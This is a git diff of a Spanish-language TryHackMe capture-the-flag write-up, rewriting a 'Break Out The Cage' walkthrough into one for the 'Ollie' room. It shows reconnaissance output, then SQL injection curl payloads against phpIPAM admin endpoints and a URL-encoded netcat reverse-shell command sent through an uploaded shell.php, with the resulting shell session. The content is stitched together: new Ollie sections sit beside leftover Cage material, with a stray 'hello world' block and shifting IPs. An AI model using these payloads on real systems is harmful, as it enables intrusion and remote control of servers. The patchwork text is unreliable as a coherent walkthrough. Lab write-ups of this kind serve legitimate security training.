@@ -12,45 +12,61 @@ categories:
   - TryHackMe
   - infosec
 tags:
-  - python
-  - steg
-  - rot13
+  - CVE
+  - Security
+  - Ollie
+  - Exploit
 
 ---
 
 
 ![](/assets/images/thm-writeup-ollie/ollie_logo.png)
 
- [Link](https://tryhackme.com/room/breakoutthecage1 "Break Out The Cage.1")
+ [Link](https://tryhackme.com/room/ollie "Ollie")
 
-Help Cage bring back his acting career and investigate the nefarious goings on of his agent!
+Ollie Unix Montgomery, the infamous hacker dog, is a great red teamer. As for development... not so much! Rumor has it, Ollie messed with a few of the files on the server to ensure backward compatibility. Take control before time runs out!!
 
 ## 1. Fase de reconocimiento
 
 - Para  conocer a que nos estamos enfrentando lanzamos el siguiente comando:
 
-```
-└─# ping -c 1 10.10.155.102
-PING 10.10.155.102 (10.10.155.102) 56(84) bytes of data.
-64 bytes from 10.10.155.102: icmp_seq=1 ttl=63 time=196 ms
 
---- 10.10.155.102 ping statistics ---
+```bash
+ping -c 1 {ip}
+```
+
+
+```
+print("hello world")
+```
+
+
+~~~bash
+└─$ ping -c 1 10.10.96.248
+PING 10.10.96.248 (10.10.96.248) 56(84) bytes of data.
+64 bytes from 10.10.96.248: icmp_seq=1 ttl=63 time=162 ms
+
+--- 10.10.96.248 ping statistics ---
 1 packets transmitted, 1 received, 0% packet loss, time 0ms
-rtt min/avg/max/mdev = 195.728/195.728/195.728/0.000 ms
+rtt min/avg/max/mdev = 161.558/161.558/161.558/0.000 ms
 
-```
-- De acuerdo con el ttl=63, sabemos que nos estamos enfrentando ante una máquina con sistema operativo linux.
+~~~
+
+- De acuerdo con el ***ttl=63***, sabemos que nos estamos enfrentando ante una máquina con sistema operativo linux.
 
 - Whatweb, nos muestra la siguiente información:
   
-  ```
-  └─# whatweb 10.10.155.102       http://10.10.155.102 [200 OK] Apache[2.4.29], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.29 (Ubuntu)], IP[10.10.155.102], Title[Nicholas Cage Stories]
+  ```bash
+  └─$ whatweb 10.10.96.248                         
+http://10.10.96.248 [302 Found] Apache[2.4.41], Cookies[phpipamredirect], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], HttpOnly[phpipamredirect], IP[10.10.96.248], RedirectLocation[http://10.10.96.248/index.php?page=login]
+http://10.10.96.248/index.php?page=login [200 OK] Apache[2.4.41], Bootstrap, Cookies[phpipam], Country[RESERVED][ZZ], Email[0day@ollieshouse.thm], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], HttpOnly[phpipam], IP[10.10.96.248], JQuery[3.5.1], PasswordField[ipampassword], Script[text/javascript], Title[Ollie :: login], X-UA-Compatible[IE=9,chrome=1], X-XSS-Protection[1; mode=block]
+
   ```
 ---
 
 - Página web: observamos la siguiente página:
 
-![](/assets/images/thm-writeup-break-out-the-cage/cage_page.png)
+![](/assets/images/thm-writeup-ollie/ollie_page.png "ollie-page")
 
 
 ---
@@ -61,83 +77,182 @@ rtt min/avg/max/mdev = 195.728/195.728/195.728/0.000 ms
 
 - Escaneo de los 65536 puertos de red con nmap:
   
-```
-─# nmap -p- -sS --min-rate 5000 --open -vvv -n -Pn 10.10.155.102
+```bash
+└─# nmap -p- -sS --min-rate 5000 --open -vvv -n -Pn 10.10.96.248 -oN allports
 Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
-Starting Nmap 7.92 ( https://nmap.org ) at 2022-04-18 20:30 -05
-Initiating SYN Stealth Scan at 20:30
-Scanning 10.10.155.102 [65535 ports]
-Discovered open port 22/tcp on 10.10.155.102
-Discovered open port 21/tcp on 10.10.155.102
-Discovered open port 80/tcp on 10.10.155.102
-Completed SYN Stealth Scan at 20:30, 13.83s elapsed (65535 total ports)
-Nmap scan report for 10.10.155.102
-Host is up, received user-set (0.16s latency).
-Scanned at 2022-04-18 20:30:08 -05 for 13s
+Starting Nmap 7.92 ( https://nmap.org ) at 2022-04-19 20:32 -05
+Initiating SYN Stealth Scan at 20:32
+Scanning 10.10.96.248 [65535 ports]
+Discovered open port 22/tcp on 10.10.96.248
+Discovered open port 80/tcp on 10.10.96.248
+Discovered open port 1337/tcp on 10.10.96.248
+Completed SYN Stealth Scan at 20:33, 14.61s elapsed (65535 total ports)
+Nmap scan report for 10.10.96.248
+Host is up, received user-set (0.17s latency).
+Scanned at 2022-04-19 20:32:52 -05 for 15s
 Not shown: 65532 closed tcp ports (reset)
-PORT   STATE SERVICE REASON
-21/tcp open  ftp     syn-ack ttl 63
-22/tcp open  ssh     syn-ack ttl 63
-80/tcp open  http    syn-ack ttl 63
+PORT     STATE SERVICE REASON
+22/tcp   open  ssh     syn-ack ttl 63
+80/tcp   open  http    syn-ack ttl 63
+1337/tcp open  waste   syn-ack ttl 62
 
 Read data files from: /usr/bin/../share/nmap
-Nmap done: 1 IP address (1 host up) scanned in 13.92 seconds
-           Raw packets sent: 68140 (2.998MB) | Rcvd: 67949 (2.718MB)
+Nmap done: 1 IP address (1 host up) scanned in 14.70 seconds
+           Raw packets sent: 72151 (3.175MB) | Rcvd: 71568 (2.863MB)
 ```
 
 - El anterior escaneo evidencia los siguientes puertos abiertos:
 
 | Puerto  | Descripción |
 | ---     | ---         |
-| 21      | ftp         |
 | 22      | ssh         |
-| 80      | http        |
+| 80      | htp         |
+| 1337    | waste       |
 
 - Escaneo en busca de vulnerabilidades sobre los puertos abiertos:
 
-```
-└─# sudo nmap -T4 -sC -sV -oA scan -p- 10.10.155.102
-Starting Nmap 7.92 ( https://nmap.org ) at 2022-04-18 20:48 -05
-Nmap scan report for 10.10.155.102 (10.10.155.102)
+```bash
+└─# nmap -sCV -A -T4 -p22,80,1337 10.10.96.248                               
+Starting Nmap 7.92 ( https://nmap.org ) at 2022-04-19 20:35 -05
+Nmap scan report for 10.10.96.248 (10.10.96.248)
 Host is up (0.16s latency).
-Not shown: 65532 closed tcp ports (reset)
-PORT   STATE SERVICE VERSION
-21/tcp open  ftp     vsftpd 3.0.3
-| ftp-anon: Anonymous FTP login allowed (FTP code 230)
-|_-rw-r--r--    1 0        0             396 May 25  2020 dad_tasks
-| ftp-syst: 
-|   STAT: 
-| FTP server status:
-|      Connected to ::ffff:10.9.1.216
-|      Logged in as ftp
-|      TYPE: ASCII
-|      No session bandwidth limit
-|      Session timeout in seconds is 300
-|      Control connection is plain text
-|      Data connections will be plain text
-|      At session startup, client count was 4
-|      vsFTPd 3.0.3 - secure, fast, stable
-|_End of status
-22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
-| ssh-hostkey: 
-|   2048 dd:fd:88:94:f8:c8:d1:1b:51:e3:7d:f8:1d:dd:82:3e (RSA)
-|   256 3e:ba:38:63:2b:8d:1c:68:13:d5:05:ba:7a:ae:d9:3b (ECDSA)
-|_  256 c0:a6:a3:64:44:1e:cf:47:5f:85:f6:1f:78:4c:59:d8 (ED25519)
-80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
-|_http-title: Nicholas Cage Stories
-|_http-server-header: Apache/2.4.29 (Ubuntu)
-Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
 
-Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-Nmap done: 1 IP address (1 host up) scanned in 160.00 seconds
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   3072 b7:1b:a8:f8:8c:8a:4a:53:55:c0:2e:89:01:f2:56:69 (RSA)
+|   256 4e:27:43:b6:f4:54:f9:18:d0:38:da:cd:76:9b:85:48 (ECDSA)
+|_  256 14:82:ca:bb:04:e5:01:83:9c:d6:54:e9:d1:fa:c4:82 (ED25519)
+80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))
+| http-title: Ollie :: login
+|_Requested resource was http://10.10.96.248/index.php?page=login
+| http-robots.txt: 2 disallowed entries 
+|_/ /immaolllieeboyyy
+|_http-server-header: Apache/2.4.41 (Ubuntu)
+1337/tcp open  waste?
+| fingerprint-strings: 
+|   DNSStatusRequestTCP, GenericLines: 
+|     Hey stranger, I'm Ollie, protector of panels, lover of deer antlers.
+|     What is your name? What's up, 
+|     It's been a while. What are you here for?
+|   DNSVersionBindReqTCP: 
+|     Hey stranger, I'm Ollie, protector of panels, lover of deer antlers.
+|     What is your name? What's up, 
+|     version
+|     bind
+|     It's been a while. What are you here for?
+|   GetRequest: 
+|     Hey stranger, I'm Ollie, protector of panels, lover of deer antlers.
+|     What is your name? What's up, Get / http/1.0
+|     It's been a while. What are you here for?
+|   HTTPOptions: 
+|     Hey stranger, I'm Ollie, protector of panels, lover of deer antlers.
+|     What is your name? What's up, Options / http/1.0
+|     It's been a while. What are you here for?
+|   Help: 
+|     Hey stranger, I'm Ollie, protector of panels, lover of deer antlers.
+|     What is your name? What's up, Help
+|     It's been a while. What are you here for?
+|   NULL, RPCCheck: 
+|     Hey stranger, I'm Ollie, protector of panels, lover of deer antlers.
+|     What is your name?
+|   RTSPRequest: 
+|     Hey stranger, I'm Ollie, protector of panels, lover of deer antlers.
+|     What is your name? What's up, Options / rtsp/1.0
+|_    It's been a while. What are you here for?
+1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+SF-Port1337-TCP:V=7.92%I=7%D=4/19%Time=625F634C%P=x86_64-pc-linux-gnu%r(NU
+SF:LL,59,"Hey\x20stranger,\x20I'm\x20Ollie,\x20protector\x20of\x20panels,\
+SF:x20lover\x20of\x20deer\x20antlers\.\n\nWhat\x20is\x20your\x20name\?\x20
+SF:")%r(GenericLines,93,"Hey\x20stranger,\x20I'm\x20Ollie,\x20protector\x2
+SF:0of\x20panels,\x20lover\x20of\x20deer\x20antlers\.\n\nWhat\x20is\x20you
+SF:r\x20name\?\x20What's\x20up,\x20\r\n\r!\x20It's\x20been\x20a\x20while\.
+SF:\x20What\x20are\x20you\x20here\x20for\?\x20")%r(GetRequest,A1,"Hey\x20s
+SF:tranger,\x20I'm\x20Ollie,\x20protector\x20of\x20panels,\x20lover\x20of\
+SF:x20deer\x20antlers\.\n\nWhat\x20is\x20your\x20name\?\x20What's\x20up,\x
+SF:20Get\x20/\x20http/1\.0\r\n\r!\x20It's\x20been\x20a\x20while\.\x20What\
+SF:x20are\x20you\x20here\x20for\?\x20")%r(HTTPOptions,A5,"Hey\x20stranger,
+SF:\x20I'm\x20Ollie,\x20protector\x20of\x20panels,\x20lover\x20of\x20deer\
+SF:x20antlers\.\n\nWhat\x20is\x20your\x20name\?\x20What's\x20up,\x20Option
+SF:s\x20/\x20http/1\.0\r\n\r!\x20It's\x20been\x20a\x20while\.\x20What\x20a
+SF:re\x20you\x20here\x20for\?\x20")%r(RTSPRequest,A5,"Hey\x20stranger,\x20
+SF:I'm\x20Ollie,\x20protector\x20of\x20panels,\x20lover\x20of\x20deer\x20a
+SF:ntlers\.\n\nWhat\x20is\x20your\x20name\?\x20What's\x20up,\x20Options\x2
+SF:0/\x20rtsp/1\.0\r\n\r!\x20It's\x20been\x20a\x20while\.\x20What\x20are\x
+SF:20you\x20here\x20for\?\x20")%r(RPCCheck,59,"Hey\x20stranger,\x20I'm\x20
+SF:Ollie,\x20protector\x20of\x20panels,\x20lover\x20of\x20deer\x20antlers\
+SF:.\n\nWhat\x20is\x20your\x20name\?\x20")%r(DNSVersionBindReqTCP,B0,"Hey\
+SF:x20stranger,\x20I'm\x20Ollie,\x20protector\x20of\x20panels,\x20lover\x2
+SF:0of\x20deer\x20antlers\.\n\nWhat\x20is\x20your\x20name\?\x20What's\x20u
+SF:p,\x20\0\x1e\0\x06\x01\0\0\x01\0\0\0\0\0\0\x07version\x04bind\0\0\x10\0
+SF:\x03!\x20It's\x20been\x20a\x20while\.\x20What\x20are\x20you\x20here\x20
+SF:for\?\x20")%r(DNSStatusRequestTCP,9E,"Hey\x20stranger,\x20I'm\x20Ollie,
+SF:\x20protector\x20of\x20panels,\x20lover\x20of\x20deer\x20antlers\.\n\nW
+SF:hat\x20is\x20your\x20name\?\x20What's\x20up,\x20\0\x0c\0\0\x10\0\0\0\0\
+SF:0\0\0\0\0!\x20It's\x20been\x20a\x20while\.\x20What\x20are\x20you\x20her
+SF:e\x20for\?\x20")%r(Help,95,"Hey\x20stranger,\x20I'm\x20Ollie,\x20protec
+SF:tor\x20of\x20panels,\x20lover\x20of\x20deer\x20antlers\.\n\nWhat\x20is\
+SF:x20your\x20name\?\x20What's\x20up,\x20Help\r!\x20It's\x20been\x20a\x20w
+SF:hile\.\x20What\x20are\x20you\x20here\x20for\?\x20");
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+Aggressive OS guesses: Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Linux 2.6.32 (92%), Linux 2.6.39 - 3.2 (92%), Linux 3.1 - 3.2 (92%), Linux 3.2 - 4.9 (92%), Linux 3.7 - 3.10 (92%)
+No exact OS matches for host (test conditions non-ideal).
+Network Distance: 2 hops
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE (using port 443/tcp)
+HOP RTT       ADDRESS
+1   161.55 ms 10.9.0.1 (10.9.0.1)
+2   161.70 ms 10.10.96.248 (10.10.96.248)
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 172.86 seconds
 ```
+
+
+
+curl 'http://10.10.96.248/app/admin/custom-fields/edit.php' -H 'User-Agent: Mozilla/5.0 AppleWebKit/537.36 537.36' -H 'Cookie: phpipam=b852d916168309592ddade2e11847e48; table-page-size=50' -d 'action=add&table=users`where 1=(updatexml(1,concat(0x3a,(select user())),1))#`' --compressed --insecure
+
+curl 'http://10.10.96.248/app/admin/custom-fields/edit-result.php' -H 'User-Agent: Mozilla/5.0 AppleWebKit/537.36 537.36' -H 'Cookie: phpipam=b852d916168309592ddade2e11847e48; table-page-size=50' -d 'action=add&table=users`;select * from users where 1=sleep(10);#`&csrf_cookie=ylbgj5gvd5OFeTeVPMQVgCaD8zxMro1R&name=asdfadsf' --compressed --insecure
+
+curl 'http://10.10.96.248/app/admin/custom-fields/filter-result.php'-H 'User-Agent: Mozilla/5.0 AppleWebKit/537.36 537.36' -H 'Cookie: phpipam=b852d916168309592ddade2e11847e48; table-page-size=50' -d 'action=add&table=users`where 1=(updatexml(1,concat(0x3a,(select user())),1))#`' --compressed --insecure
+
+curl 'http://10.10.96.248/app/admin/custom-fields/order.php' -H 'User-Agent: Mozilla/5.0 AppleWebKit/537.36 537.36' -H 'Cookie: phpipam=b852d916168309592ddade2e11847e48; table-page-size=50' -d 'action=add&table=users`;select * from users where 1=sleep(10);#`&current=1&next=3' --compressed --insecure
+
+$ python3 -m pip install requests
+$ python3 exploit.py -u http://localhost:8082 -U <admin> -P <password>
+
+[Terminal 1]
+╰─ curl http://10.10.96.248/shell.php\?cmd\=rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7Csh%20-i%202%3E%261%7Cnc%2010.9.0.244%201337%20%3E%2Ftmp%2Ff
+
+------------------------------------------------------------------------------------------
+
+[Terminal 2]
+╰─ nc -nlvp 1337                                                                                ─╯
+listening on [any] 1337 ...
+connect to [10.9.0.244] from (UNKNOWN) [10.10.229.233] 43490
+sh: 0: can't access tty; job control turned off
+$ id; whoami; pwd; hostname
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+www-data
+/var/www/html
+hackerdog
+
+
+
+
+
+
+
+
 
 ### 2.2 WFUZZ
 
 - Procedemos a realizar escaneo de los directorios:
   
 ```
-└─# wfuzz --hc=404 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt 10.10.155.102/FUZZ /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
+└─# wfuzz --hc=404 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt 10.10.155.102/FUZZ
+/usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
 ********************************************************
 * Wfuzz 3.1.0 - The Web Fuzzer                         *
 ********************************************************
@@ -319,7 +434,7 @@ weston@national-treasure:/opt/.dads_scripts/.files$ echo "Nicolas; rm /tmp/f;mkf
 
 - Ganamos acceso como usuario Cage y en el archivo ***Super_Duper_Checklist*** encontramos la bandera:
   
-```
+~~~
 cage@national-treasure:~$ cd Super_Duper_Checklist
 cd Super_Duper_Checklist
 bash: cd: Super_Duper_Checklist: Not a directory
@@ -330,7 +445,7 @@ cat Super_Duper_Checklist
 3 - Get a new pet octopus
 4 - Try and keep current wife
 5 - Figure out why Weston has this etched into his desk: THM{???????????}
-```
+~~~
 
 
 ## 5 Escalada de Privelegios
